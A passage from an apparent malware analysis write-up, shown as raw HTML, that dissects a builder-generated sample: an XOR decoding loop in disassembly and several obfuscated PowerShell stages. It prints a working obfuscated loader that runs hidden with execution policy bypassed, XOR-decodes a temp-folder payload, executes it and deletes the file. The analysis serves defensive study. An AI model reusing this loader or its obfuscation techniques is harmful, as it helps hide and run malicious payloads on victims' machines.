id="crayon-5f694cd07d7e1479423373-9"><span class="crayon-cn">00401669</span><span class="crayon-h">&nbsp;&nbsp; </span><span class="crayon-o">|</span><span class="crayon-sy">.</span><span class="crayon-h"> </span><span class="crayon-o">|</span><span class="crayon-v">F7E2</span><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-o">|</span><span class="crayon-e">MUL </span><span class="crayon-i">EDX</span><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; </span><span class="crayon-sy">;</span><span class="crayon-h">&nbsp;&nbsp;</span><span class="crayon-cn">75809731.004067E0</span></div><div class="crayon-line crayon-striped-line" id="crayon-5f694cd07d7e1479423373-10"><span class="crayon-cn">0040166B</span><span class="crayon-h">&nbsp;&nbsp; </span><span class="crayon-o">|</span><span class="crayon-sy">.</span><span class="crayon-h"> </span><span class="crayon-o">|</span><span class="crayon-cn">89D0</span><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-o">|</span><span class="crayon-e">MOV </span><span class="crayon-v">EAX</span><span class="crayon-sy">,</span><span class="crayon-i">EDX</span><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; </span><span class="crayon-sy">;</span><span class="crayon-h">&nbsp;&nbsp;</span><span class="crayon-cn">75809731.004067E0</span></div><div class="crayon-line" id="crayon-5f694cd07d7e1479423373-11"><span class="crayon-cn">0040166D</span><span class="crayon-h">&nbsp;&nbsp; </span><span class="crayon-o">|</span><span class="crayon-sy">.</span><span class="crayon-h"> </span><span class="crayon-o">|</span><span class="crayon-i">C1E8</span><span class="crayon-h"> </span><span class="crayon-cn">02</span><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; </span><span class="crayon-o">|</span><span class="crayon-e">SHR </span><span class="crayon-v">EAX</span><span class="crayon-sy">,</span><span class="crayon-cn">2</span></div><div class="crayon-line crayon-striped-line" id="crayon-5f694cd07d7e1479423373-12"><span class="crayon-cn">00401670</span><span class="crayon-h">&nbsp;&nbsp; </span><span class="crayon-o">|</span><span class="crayon-sy">.</span><span class="crayon-h"> </span><span class="crayon-o">|</span><span class="crayon-cn">69C0</span><span class="crayon-h"> </span><span class="crayon-v">C0370000</span><span class="crayon-h">&nbsp;&nbsp; </span><span class="crayon-o">|</span><span class="crayon-e">IMUL </span><span class="crayon-v">EAX</span><span class="crayon-sy">,</span><span class="crayon-v">EAX</span><span class="crayon-sy">,</span><span class="crayon-cn">37C0</span></div><div class="crayon-line" id="crayon-5f694cd07d7e1479423373-13"><span class="crayon-cn">00401676</span><span class="crayon-h">&nbsp;&nbsp; </span><span class="crayon-o">|</span><span class="crayon-sy">.</span><span class="crayon-h"> </span><span class="crayon-o">|</span><span class="crayon-cn">29C1</span><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-o">|</span><span class="crayon-e">SUB </span><span class="crayon-v">ECX</span><span class="crayon-sy">,</span><span class="crayon-i">EAX</span></div><div class="crayon-line crayon-striped-line" id="crayon-5f694cd07d7e1479423373-14"><span class="crayon-cn">00401678</span><span class="crayon-h">&nbsp;&nbsp; </span><span class="crayon-o">|</span><span class="crayon-sy">.</span><span class="crayon-h"> </span><span class="crayon-o">|</span><span class="crayon-cn">89C8</span><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-o">|</span><span class="crayon-e">MOV </span><span class="crayon-v">EAX</span><span class="crayon-sy">,</span><span class="crayon-i">ECX</span></div><div class="crayon-line" id="crayon-5f694cd07d7e1479423373-15"><span class="crayon-cn">0040167A</span><span class="crayon-h">&nbsp;&nbsp; </span><span class="crayon-o">|</span><span class="crayon-sy">.</span><span class="crayon-h"> </span><span class="crayon-o">|</span><span class="crayon-cn">0FB68405</span><span class="crayon-h"> </span><span class="crayon-cn">188FFF</span><span class="crayon-o">&gt;</span><span class="crayon-o">|</span><span class="crayon-e">MOVZX </span><span class="crayon-v">EAX</span><span class="crayon-sy">,</span><span class="crayon-t">BYTE</span><span class="crayon-h"> </span><span class="crayon-e">PTR </span><span class="crayon-v">SS</span><span class="crayon-o">:</span><span class="crayon-sy">[</span><span class="crayon-v">EBP</span><span class="crayon-o">+</span><span class="crayon-v">EAX</span><span class="crayon-o">+</span><span class="crayon-v">FFFF8F18</span><span class="crayon-sy">]</span></div><div class="crayon-line crayon-striped-line" id="crayon-5f694cd07d7e1479423373-16"><span class="crayon-cn">00401682</span><span class="crayon-h">&nbsp;&nbsp; </span><span class="crayon-o">|</span><span class="crayon-sy">.</span><span class="crayon-h"> </span><span class="crayon-o">|</span><span class="crayon-cn">31C3</span><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-o">|</span><span class="crayon-st">XOR</span><span class="crayon-h"> </span><span class="crayon-v">EBX</span><span class="crayon-sy">,</span><span class="crayon-i">EAX</span></div><div class="crayon-line" id="crayon-5f694cd07d7e1479423373-17"><span class="crayon-cn">00401684</span><span class="crayon-h">&nbsp;&nbsp; </span><span class="crayon-o">|</span><span class="crayon-sy">.</span><span class="crayon-h"> </span><span class="crayon-o">|</span><span class="crayon-cn">89D9</span><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-o">|</span><span class="crayon-e">MOV </span><span class="crayon-v">ECX</span><span class="crayon-sy">,</span><span class="crayon-i">EBX</span></div><div class="crayon-line crayon-striped-line" id="crayon-5f694cd07d7e1479423373-18"><span class="crayon-cn">00401686</span><span class="crayon-h">&nbsp;&nbsp; </span><span class="crayon-o">|</span><span class="crayon-sy">.</span><span class="crayon-h"> </span><span class="crayon-o">|</span><span class="crayon-cn">8D95</span><span class="crayon-h"> </span><span class="crayon-v">D8C6FFFF</span><span class="crayon-h">&nbsp;&nbsp; </span><span class="crayon-o">|</span><span class="crayon-e">LEA </span><span class="crayon-v">EDX</span><span class="crayon-sy">,</span><span class="crayon-sy">[</span><span class="crayon-v">LOCAL</span><span class="crayon-sy">.</span><span class="crayon-cn">3658</span><span class="crayon-sy">]</span></div><div class="crayon-line" id="crayon-5f694cd07d7e1479423373-19"><span class="crayon-cn">0040168C</span><span class="crayon-h">&nbsp;&nbsp; </span><span class="crayon-o">|</span><span class="crayon-sy">.</span><span class="crayon-h"> </span><span class="crayon-o">|</span><span class="crayon-cn">8B45</span><span class="crayon-h"> </span><span class="crayon-v">F4</span><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; </span><span class="crayon-o">|</span><span class="crayon-e">MOV </span><span class="crayon-v">EAX</span><span class="crayon-sy">,</span><span class="crayon-sy">[</span><span class="crayon-v">LOCAL</span><span class="crayon-sy">.</span><span class="crayon-cn">3</span><span class="crayon-sy">]</span></div><div class="crayon-line crayon-striped-line" id="crayon-5f694cd07d7e1479423373-20"><span class="crayon-cn">0040168F</span><span class="crayon-h">&nbsp;&nbsp; </span><span class="crayon-o">|</span><span class="crayon-sy">.</span><span class="crayon-h"> </span><span class="crayon-o">|</span><span class="crayon-cn">01D0</span><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-o">|</span><span class="crayon-e">ADD </span><span class="crayon-v">EAX</span><span class="crayon-sy">,</span><span class="crayon-i">EDX</span><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; </span><span class="crayon-sy">;</span><span class="crayon-h">&nbsp;&nbsp;</span><span class="crayon-cn">75809731.004067E0</span></div><div class="crayon-line" id="crayon-5f694cd07d7e1479423373-21"><span class="crayon-cn">00401691</span><span class="crayon-h">&nbsp;&nbsp; </span><span class="crayon-o">|</span><span class="crayon-sy">.</span><span class="crayon-h"> </span><span class="crayon-o">|</span><span class="crayon-cn">8808</span><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-o">|</span><span class="crayon-e">MOV </span><span class="crayon-t">BYTE</span><span class="crayon-h"> </span><span class="crayon-e">PTR </span><span class="crayon-v">DS</span><span class="crayon-o">:</span><span class="crayon-sy">[</span><span class="crayon-v">EAX</span><span class="crayon-sy">]</span><span class="crayon-sy">,</span><span class="crayon-i">CL</span></div><div class="crayon-line crayon-striped-line" id="crayon-5f694cd07d7e1479423373-22"><span class="crayon-cn">00401693</span><span class="crayon-h">&nbsp;&nbsp; </span><span class="crayon-o">|</span><span class="crayon-sy">.</span><span class="crayon-h"> </span><span class="crayon-o">|</span><span class="crayon-cn">8345</span><span class="crayon-h"> </span><span class="crayon-i">F4</span><span class="crayon-h"> </span><span class="crayon-cn">01</span><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-o">|</span><span class="crayon-i">ADD</span><span class="crayon-h"> </span><span class="crayon-sy">[</span><span class="crayon-v">LOCAL</span><span class="crayon-sy">.</span><span class="crayon-cn">3</span><span class="crayon-sy">]</span><span class="crayon-sy">,</span><span class="crayon-cn">1</span></div><div class="crayon-line" id="crayon-5f694cd07d7e1479423373-23"><span class="crayon-cn">00401697</span><span class="crayon-h">&nbsp;&nbsp; </span><span class="crayon-o">|</span><span class="crayon-o">&gt;</span><span class="crayon-h"> </span><span class="crayon-o">|</span><span class="crayon-cn">8B45</span><span class="crayon-h"> </span><span class="crayon-e">F4&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-e">MOV </span><span class="crayon-v">EAX</span><span class="crayon-sy">,</span><span class="crayon-sy">[</span><span class="crayon-v">LOCAL</span><span class="crayon-sy">.</span><span class="crayon-cn">3</span><span class="crayon-sy">]</span><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; </span><span class="crayon-sy">;</span><span class="crayon-h"> </span><span class="crayon-o">||</span><span class="crayon-o">||</span></div><div class="crayon-line crayon-striped-line" id="crayon-5f694cd07d7e1479423373-24"><span class="crayon-cn">0040169A</span><span class="crayon-h">&nbsp;&nbsp; </span><span class="crayon-o">|</span><span class="crayon-sy">.</span><span class="crayon-h"> </span><span class="crayon-o">|</span><span class="crayon-cn">3D</span><span class="crayon-h"> </span><span class="crayon-v">BF370000</span><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp; </span><span class="crayon-o">|</span><span class="crayon-e">CMP </span><span class="crayon-v">EAX</span><span class="crayon-sy">,</span><span class="crayon-cn">37BF</span><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-sy">;</span><span class="crayon-h"> </span><span class="crayon-o">||</span><span class="crayon-o">||</span></div><div class="crayon-line" id="crayon-5f694cd07d7e1479423373-25"><span class="crayon-cn">0040169F</span><span class="crayon-h">&nbsp;&nbsp; </span><span class="crayon-o">|</span><span class="crayon-sy">.</span><span class="crayon-o">^</span><span class="crayon-sy">\</span><span class="crayon-cn">76</span><span class="crayon-h"> </span><span class="crayon-i">AD</span><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; </span><span class="crayon-sy">\</span><span class="crayon-e">JBE </span><span class="crayon-t">SHORT</span><span class="crayon-h"> </span><span class="crayon-cn">75809731.0040164E</span><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; </span><span class="crayon-sy">;</span><span class="crayon-h"> </span><span class="crayon-o">||</span><span class="crayon-o">||</span></div></div></td>
+					</tr>
+				</table>
+			</div>
+		</div>
+<!-- [Format Time: 0.0027 seconds] -->
+<p>The second set of data is an equal length XOR key and this function just XORs each byte of the two segments of data and then writes the output to the file.<br />
+It goes through this process one again, copying two sections of data from the .data section and XOR’ing them together to decode the first of the PowerShell commands which it then passes to CreateProcessA(); this command will be analyzed in the next section.<br />
+Finally, the executable calls MessageBoxA and displays a fake error message. Note that tool gives the user the option whether to include this error message.<br />
+&nbsp;<br />
+<span style="font-size: 18pt;">PowerShell Analysis</span><br />
+The first PowerShell script that gets launched begins with simple Hex -&gt; ASCII obfuscation. Between samples, the arguments are random camel case and shortened differently each time.</p><!-- Crayon Syntax Highlighter v_2.7.2_beta -->
+
+		<div id="crayon-5f694cd07d7e4611217128" class="crayon-syntax crayon-theme-classic crayon-font-monaco crayon-os-pc print-yes notranslate" data-settings=" minimize scroll-mouseover wrap" style=" margin-top: 12px; margin-bottom: 12px; font-size: 12px !important; line-height: 15px !important;">
+		
+			<div class="crayon-toolbar" data-settings=" mouseover overlay hide delay" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><span class="crayon-title"></span>
+			<div class="crayon-tools" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><div class="crayon-button crayon-nums-button" title="Toggle Line Numbers"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-plain-button" title="Toggle Plain Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-wrap-button" title="Toggle Line Wrap"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-expand-button" title="Expand Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-copy-button" title="Copy"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-popup-button" title="Open Code In New Window"><div class="crayon-button-icon"></div></div></div></div>
+			<div class="crayon-info" style="min-height: 16.8px !important; line-height: 16.8px !important;"></div>
+			<div class="crayon-plain-wrap"><textarea  class="crayon-plain print-no" data-settings="dblclick" readonly style="-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 12px !important; line-height: 15px !important;">
+PowerSHeLl -WiNdOwsty hiDDeN -comMA "(-JoIn(('2628277b317d7b307d27 …</textarea></div>
+			<div class="crayon-main" style="">
+				<table class="crayon-table">
+					<tr class="crayon-row">
+				<td class="crayon-nums " data-settings="show">
+					<div class="crayon-nums-content" style="font-size: 12px !important; line-height: 15px !important;"><div class="crayon-num" data-line="crayon-5f694cd07d7e4611217128-1">1</div></div>
+				</td>
+						<td class="crayon-code"><div class="crayon-pre" style="font-size: 12px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;"><div class="crayon-line" id="crayon-5f694cd07d7e4611217128-1"><span class="crayon-v">PowerSHeLl</span><span class="crayon-h"> </span><span class="crayon-o">-</span><span class="crayon-e">WiNdOwsty </span><span class="crayon-v">hiDDeN</span><span class="crayon-h"> </span><span class="crayon-o">-</span><span class="crayon-i">comMA</span><span class="crayon-h"> </span>"<span class="crayon-sy">(</span><span class="crayon-o">-</span><span class="crayon-v">JoIn</span><span class="crayon-sy">(</span><span class="crayon-sy">(</span>'<span class="crayon-cn">2628277b317d7b307d27</span><span class="crayon-h"> </span>…</div></div></td>
+					</tr>
+				</table>
+			</div>
+		</div>
+<!-- [Format Time: 0.0002 seconds] -->
+<p>Looking at the source code now, you can see where it passes these arguments to an obfuscation function which makes identification from this perspective alone more difficult.</p><!-- Crayon Syntax Highlighter v_2.7.2_beta -->
+
+		<div id="crayon-5f694cd07d7e6954153962" class="crayon-syntax crayon-theme-classic crayon-font-monaco crayon-os-pc print-yes notranslate" data-settings=" minimize scroll-mouseover wrap" style=" margin-top: 12px; margin-bottom: 12px; font-size: 12px !important; line-height: 15px !important;">
+		
+			<div class="crayon-toolbar" data-settings=" mouseover overlay hide delay" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><span class="crayon-title"></span>
+			<div class="crayon-tools" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><div class="crayon-button crayon-nums-button" title="Toggle Line Numbers"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-plain-button" title="Toggle Plain Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-wrap-button" title="Toggle Line Wrap"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-expand-button" title="Expand Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-copy-button" title="Copy"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-popup-button" title="Open Code In New Window"><div class="crayon-button-icon"></div></div></div></div>
+			<div class="crayon-info" style="min-height: 16.8px !important; line-height: 16.8px !important;"></div>
+			<div class="crayon-plain-wrap"><textarea  class="crayon-plain print-no" data-settings="dblclick" readonly style="-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 12px !important; line-height: 15px !important;">
+: "[_OBF_POWERSHELL_] -[_OBF_WINDOWSTYLE_] [_OBF_HIDDEN_] -[_OBF_COMMAND_] \"[_PS_LOAD_]\"",</textarea></div>
+			<div class="crayon-main" style="">
+				<table class="crayon-table">
+					<tr class="crayon-row">
+				<td class="crayon-nums " data-settings="show">
+					<div class="crayon-nums-content" style="font-size: 12px !important; line-height: 15px !important;"><div class="crayon-num" data-line="crayon-5f694cd07d7e6954153962-1">1</div></div>
+				</td>
+						<td class="crayon-code"><div class="crayon-pre" style="font-size: 12px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;"><div class="crayon-line" id="crayon-5f694cd07d7e6954153962-1"><span class="crayon-o">:</span><span class="crayon-h"> </span><span class="crayon-s">"[_OBF_POWERSHELL_] -[_OBF_WINDOWSTYLE_] [_OBF_HIDDEN_] -[_OBF_COMMAND_] \"[_PS_LOAD_]\""</span><span class="crayon-sy">,</span></div></div></td>
+					</tr>
+				</table>
+			</div>
+		</div>
+<!-- [Format Time: 0.0001 seconds] -->
+<p>While the commands and case may change, the order does not.<br />
+The decoded script is the first one utilizing the unique obfuscation technique mentioned previously. Its combines multiple styles of token replacement obfuscation and chains together Invoke functions to build a new script which simply base64 decodes and executes a third script.<br />
+Below is what you typically find with token replacement (composite formatting) obfuscation.</p><!-- Crayon Syntax Highlighter v_2.7.2_beta -->
+
+		<div id="crayon-5f694cd07d7e7554764509" class="crayon-syntax crayon-theme-classic crayon-font-monaco crayon-os-pc print-yes notranslate" data-settings=" minimize scroll-mouseover wrap" style=" margin-top: 12px; margin-bottom: 12px; font-size: 12px !important; line-height: 15px !important;">
+		
+			<div class="crayon-toolbar" data-settings=" mouseover overlay hide delay" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><span class="crayon-title"></span>
+			<div class="crayon-tools" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><div class="crayon-button crayon-nums-button" title="Toggle Line Numbers"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-plain-button" title="Toggle Plain Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-wrap-button" title="Toggle Line Wrap"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-expand-button" title="Expand Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-copy-button" title="Copy"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-popup-button" title="Open Code In New Window"><div class="crayon-button-icon"></div></div></div></div>
+			<div class="crayon-info" style="min-height: 16.8px !important; line-height: 16.8px !important;"></div>
+			<div class="crayon-plain-wrap"><textarea  class="crayon-plain print-no" data-settings="dblclick" readonly style="-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 12px !important; line-height: 15px !important;">
+('{2}{1}{3}{0}'-f'LE','i','Set-Var','ab')</textarea></div>
+			<div class="crayon-main" style="">
+				<table class="crayon-table">
+					<tr class="crayon-row">
+				<td class="crayon-nums " data-settings="show">
+					<div class="crayon-nums-content" style="font-size: 12px !important; line-height: 15px !important;"><div class="crayon-num" data-line="crayon-5f694cd07d7e7554764509-1">1</div></div>
+				</td>
+						<td class="crayon-code"><div class="crayon-pre" style="font-size: 12px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;"><div class="crayon-line" id="crayon-5f694cd07d7e7554764509-1"><span class="crayon-sy">(</span><span class="crayon-s">'{2}{1}{3}{0}'</span><span class="crayon-o">-</span><span class="crayon-i">f</span><span class="crayon-s">'LE'</span><span class="crayon-sy">,</span><span class="crayon-s">'i'</span><span class="crayon-sy">,</span><span class="crayon-s">'Set-Var'</span><span class="crayon-sy">,</span><span class="crayon-s">'ab'</span><span class="crayon-sy">)</span></div></div></td>
+					</tr>
+				</table>
+			</div>
+		</div>
+<!-- [Format Time: 0.0001 seconds] -->
+<p>This builds the string “Set-Variable” by replacing each “{#}” with the respective string value found at that index in the array.<br />
+The new method works on the same premise but instead of directly calling the index, it builds the initial string of format items by doing two replace() calls. Visually, it’s not much more difficult to understand and builds the string “value”, but from a scanning perspective it helps to further obfuscate commands and protect against common signature techniques.</p><!-- Crayon Syntax Highlighter v_2.7.2_beta -->
+
+		<div id="crayon-5f694cd07d7e8144236821" class="crayon-syntax crayon-theme-classic crayon-font-monaco crayon-os-pc print-yes notranslate" data-settings=" minimize scroll-mouseover" style=" margin-top: 12px; margin-bottom: 12px; font-size: 12px !important; line-height: 15px !important;">
+		
+			<div class="crayon-toolbar" data-settings=" mouseover overlay hide delay" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><span class="crayon-title"></span>
+			<div class="crayon-tools" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><div class="crayon-button crayon-nums-button" title="Toggle Line Numbers"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-plain-button" title="Toggle Plain Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-wrap-button" title="Toggle Line Wrap"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-expand-button" title="Expand Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-copy-button" title="Copy"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-popup-button" title="Open Code In New Window"><div class="crayon-button-icon"></div></div></div></div>
+			<div class="crayon-info" style="min-height: 16.8px !important; line-height: 16.8px !important;"></div>
+			<div class="crayon-plain-wrap"><textarea wrap="soft" class="crayon-plain print-no" data-settings="dblclick" readonly style="-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 12px !important; line-height: 15px !important;">
+(('4 2 1 0 3'-REpLaCe'\w+','{${0}}'-RePLACE' ','')-f'u','l','a','e','v')</textarea></div>
+			<div class="crayon-main" style="">
+				<table class="crayon-table">
+					<tr class="crayon-row">
+				<td class="crayon-nums " data-settings="show">
+					<div class="crayon-nums-content" style="font-size: 12px !important; line-height: 15px !important;"><div class="crayon-num" data-line="crayon-5f694cd07d7e8144236821-1">1</div></div>
+				</td>
+						<td class="crayon-code"><div class="crayon-pre" style="font-size: 12px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;"><div class="crayon-line" id="crayon-5f694cd07d7e8144236821-1"><span class="crayon-sy">(</span><span class="crayon-sy">(</span><span class="crayon-s">'4 2 1 0 3'</span><span class="crayon-o">-</span><span class="crayon-i">REpLaCe</span><span class="crayon-s">'\w+'</span><span class="crayon-sy">,</span><span class="crayon-s">'{${0}}'</span><span class="crayon-o">-</span><span class="crayon-i">RePLACE</span><span class="crayon-s">' '</span><span class="crayon-sy">,</span><span class="crayon-s">''</span><span class="crayon-sy">)</span><span class="crayon-o">-</span><span class="crayon-i">f</span><span class="crayon-s">'u'</span><span class="crayon-sy">,</span><span class="crayon-s">'l'</span><span class="crayon-sy">,</span><span class="crayon-s">'a'</span><span class="crayon-sy">,</span><span class="crayon-s">'e'</span><span class="crayon-sy">,</span><span class="crayon-s">'v'</span><span class="crayon-sy">)</span></div></div></td>
+					</tr>
+				</table>
+			</div>
+		</div>
+<!-- [Format Time: 0.0002 seconds] -->
+<p>The third script that gets executed in this phase is again a combination of obfuscation techniques that, as now known from the source code, go through individual obfuscation functions that vary this code sample to sample.</p><!-- Crayon Syntax Highlighter v_2.7.2_beta -->
+
+		<div id="crayon-5f694cd07d7e9009506676" class="crayon-syntax crayon-theme-classic crayon-font-monaco crayon-os-pc print-yes notranslate" data-settings=" minimize scroll-always wrap" style=" margin-top: 12px; margin-bottom: 12px; font-size: 12px !important; line-height: 15px !important;">
+		
+			<div class="crayon-toolbar" data-settings=" mouseover overlay hide delay" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><span class="crayon-title"></span>
+			<div class="crayon-tools" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><div class="crayon-button crayon-nums-button" title="Toggle Line Numbers"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-plain-button" title="Toggle Plain Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-wrap-button" title="Toggle Line Wrap"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-expand-button" title="Expand Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-copy-button" title="Copy"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-popup-button" title="Open Code In New Window"><div class="crayon-button-icon"></div></div></div></div>
+			<div class="crayon-info" style="min-height: 16.8px !important; line-height: 16.8px !important;"></div>
+			<div class="crayon-plain-wrap"><textarea  class="crayon-plain print-no" data-settings="dblclick" readonly style="-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 12px !important; line-height: 15px !important;">
+&amp;(('9 0 7 2 4 8 6 5 8 3 1 0'-RePlace'\w+','{${0}}'-rEPLACe' ','')-f'e','l','-','b','v','i','r','t','a','s') yZs6ssMMnN2l 27;&amp;('SEt-VariaB'+'l'+'e') ymr1vVoTcIP3 44;&amp;('{1}{0}'-f'E','SeT-VaRiaBL') lMRIO47kiset 11;&amp;('Se'+'t-vA'+'riabLE') x6ZzoiDv0Y3X((((.('Get-'+'vAR'+'iAbLe') yZs6ssMMnN2l).('vALU'+'e')+18)-AS[chaR]).('tOST'+'R'+'i'+'ng').InvoKe()+(((&amp;(('8 7 5 6 3 0 1 4 0 2 9 7'-rEpLaCE'\w+','{${0}}'-RePlaCE' ','')-f'a','r','b','v','i','t','-','e','g','l') ymr1vVoTcIP3).(('3 1 4 0 2'-REplaCE'\w+','{${0}}'-rePLaCE' ','')-f'u','a','e','v','l')+57)-As[cHaR]).('TOStr'+'In'+'G').iNVOKE()+(((&amp;('GEt-vAriaBlE') lMRIO47kiset).('va'+'Lu'+'e')+88)-AS[CHAr]).('{1}{3}{2}{0}'-f'NG','tOs','i','TR').InVokE());poWErshell -noNiNtERA -NOLO -NOprOF -window HIDdeN -eXe BypAss (&amp;('GET-vaRi'+'AbLE') x6ZzoiDv0Y3X).(('1 0 3 4 2'-rEpLaCe'\w+','{${0}}'-rEPlaCe' ','')-f'a','v','e','l','u').('tOsTri'+'n'+'g').INvokE()([chaR[]](([chAr[]](&amp;('new-o'+'bje'+'c'+'T') (('7 5 0 8 3 5 6 2 1 4 5 7 0'-replAcE'\w+','{${0}}'-rEplAcE' ','')-f't','l','c','w','i','e','b','n','.')).(('10 4 5 7 3 4 9 10 6 0 8 2 7 1'-RePLAcE'\w+','{${0}}'-repLAcE' ','')-f't','g','i','l','o','w','s','n','r','a','d').InVOke($env:temp+'\A62q1gMHhRWy'))|%{$wlITpDaitdSn=0}{$_-bxOr'cwqslBksSTba7qa7VJqrWOEWo4nQo41P'[$wlITpDaitdSn++%32]})-jOIN'');Remove-Item $env:temp'\A62q1gMHhRWy'</textarea></div>
+			<div class="crayon-main" style="">
+				<table class="crayon-table">
+					<tr class="crayon-row">
